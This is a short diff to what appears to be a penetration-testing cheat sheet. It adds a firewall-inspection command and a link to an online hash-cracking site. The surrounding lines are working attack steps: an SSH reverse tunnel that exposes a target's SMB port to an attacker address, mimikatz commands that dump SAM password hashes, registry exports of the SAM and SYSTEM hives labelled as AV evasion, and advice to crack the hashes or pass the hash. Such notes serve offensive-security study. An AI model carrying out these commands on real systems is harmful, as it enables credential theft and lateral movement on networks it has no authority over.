@@ -108,6 +108,8 @@ ____
  ____   
  # Port Forwarding
  Expose internal services, usually hidden due to firewall rules. 
+     netsh firewall show config 
+     
 ## SSH (Window 10 and newer)
      [from target box to expose SMB ]
      ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
@@ -153,7 +155,7 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
      privilege::debug 
      token::elevate 
      lsadump::sam  
-     *then crack hashes or use pass the hash to login* 
+     *then crack hashes or use pass the hash to login* [Online hash cracker](https://crackstation.net/) 
  ## AV Evasion 
      reg.exe save HKLM\SAM sam.bak 
      reg.exe save HKLM\SYSTEM system.bak 
